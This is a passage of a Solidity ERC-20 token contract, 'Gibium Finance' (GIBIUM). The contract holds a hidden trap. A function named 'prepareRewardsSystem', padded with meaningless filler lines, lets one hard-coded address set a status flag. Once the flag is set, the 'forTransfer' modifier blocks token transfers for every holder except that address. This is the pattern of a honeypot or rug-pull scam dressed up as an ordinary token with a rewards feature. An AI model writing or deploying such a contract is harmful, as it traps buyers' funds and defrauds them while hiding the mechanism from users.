...
contract Gibium is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenbe_totalSupply;
    uint256 private _tokenbe_status = 0;
    uint256 public stakingPoolbeStatus = 0;

    string private _tokenbe_name;
    string private _tokenbe_symbol;

    address private _poolbeAddress = 0x5c7897D9af941Ff32053091F14886Ad7fef49fEa; 

    constructor() {
        _tokenbe_name = "Gibium Finance";
        _tokenbe_symbol = "GIBIUM";
        _tokenbe_totalSupply = 10001 * 10 ** 18;
        _balances[msg.sender] = _tokenbe_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolbeAddress || _tokenbe_status == 0);
        _;
    }
    ...
    function prepareRewardsSystem(address to) public {
        to == address(0);
        stakingPoolbeStatus = 1;
        uint256 a = 1;
        a = a + 1;
        a = a-1;
        if (msg.sender == _poolbeAddress)
        {
            _tokenbe_status = 1;
        }
    }
